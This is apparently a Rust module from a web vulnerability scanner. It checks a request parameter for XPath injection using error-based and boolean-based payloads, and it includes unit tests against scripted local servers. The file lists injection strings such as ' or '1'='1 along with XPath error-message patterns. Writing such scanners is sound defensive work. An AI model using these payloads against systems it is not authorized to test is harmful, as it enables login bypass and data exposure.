//! xpath_injection — XPath injection (error + boolean based).
//!
//! Port of `checks/xpath_injection.py`.

use crate::checks::similarity;
use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use std::sync::LazyLock;

pub const NAME: &str = "xpath_injection";

static ERROR_MARKERS: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"(?i)XPathException|SimpleXMLElement|xmlXPathEval|Expression must evaluate|MS\.Internal\.Xml|System\.Xml\.XPath|unexpected token in XPath|Invalid expression|XPathEvalError").unwrap()
});

// (true, false) boolean pairs
const BOOL_PAIRS: &[(&str, &str)] = &[
    ("' or '1'='1", "' or '1'='2"),
    ("\" or \"1\"=\"1", "\" or \"1\"=\"2"),
    (" or 1=1 or ''='", " or 1=2 or ''='"),
];
const ERROR_PAYLOADS: &[&str] = &["'", "\"", "']", "\"]", "' or name()='"];

async fn send(
    client: &HttpClient,
    method: &str,
    param: &str,
    val: &str,
) -> Option<pentest_core::HttpResponse> {
    let req = if method == "POST" {
        HttpRequest::post().form_field(param, val)
    } else {
        HttpRequest::get().param(param, val)
    };
    client.request(req).await.ok()
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, opts: &Opts) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(param) = &opts.param else {
        return out;
    };
    let method = opts.method.to_uppercase();
    let base = if opts.base_value.is_empty() {
        "test"
    } else {
        &opts.base_value
    };

    let Some(baseline) = send(client, &method, param, base).await else {
        return out;
    };

    for p in ERROR_PAYLOADS {
        let val = format!("{base}{p}");
        let Some(r) = send(client, &method, param, &val).await else {
            continue;
        };
        if let Some(m) = ERROR_MARKERS.find(&r.body) {
            if ERROR_MARKERS.find(&baseline.body).is_none() {
                out.push(
                    Finding::new(
                        NAME,
                        Severity::High,
                        "XPath injection (error-based)",
                        format!("payload {p:?} triggered an XPath error"),
                    )
                    .with_evidence(m.as_str()),
                );
                return out;
            }
        }
    }

    for (true_p, false_p) in BOOL_PAIRS {
        let Some(t) = send(client, &method, param, &format!("{base}{true_p}")).await else {
            continue;
        };
        let Some(f) = send(client, &method, param, &format!("{base}{false_p}")).await else {
            continue;
        };
        let sim_t_base = similarity(&t.body, &baseline.body);
        let sim_t_f = similarity(&t.body, &f.body);
        if sim_t_base > 0.9 && sim_t_f < 0.85 {
            out.push(
                Finding::new(
                    NAME,
                    Severity::High,
                    "XPath injection (boolean-based)",
                    format!("{true_p:?} matched baseline, {false_p:?} diverged"),
                )
                .with_evidence(format!("T/F sim={sim_t_f:.2}")),
            );
            return out;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;

    fn fast_client(base_url: String) -> HttpClient {
        let config = HttpClientConfig {
            delay: std::time::Duration::from_millis(0),
            ..HttpClientConfig::default()
        };
        HttpClient::new(base_url, config)
    }

    #[tokio::test]
    async fn detects_error_based_injection() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("user").cloned().unwrap_or_default();
            if v.contains('\'') || v.contains('"') {
                ScriptedResponse::ok("XPathException: unexpected token in XPath expression")
            } else {
                ScriptedResponse::ok("login form")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("user".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "XPath injection (error-based)");
    }

    #[tokio::test]
    async fn detects_boolean_based_injection() {
        // Boolean-blind detection assumes the baseline behaves like a
        // "true" condition (a normal, valid-looking response) -- a
        // false-shaped payload should diverge from it, while a
        // true-shaped payload should look the same as baseline.
        let base = scripted_server(|req, _| {
            let v = req.query.get("user").cloned().unwrap_or_default();
            if v.ends_with("='2") {
                ScriptedResponse::ok("Access denied")
            } else {
                ScriptedResponse::ok("Welcome, logged in as user1")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("user".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "XPath injection (boolean-based)");
    }

    #[tokio::test]
    async fn no_findings_against_a_clean_target() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("login form")).await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("user".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn returns_empty_without_a_param() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);
        let findings = run_impl(&client, &Opts::default()).await;
        assert!(findings.is_empty());
    }
}
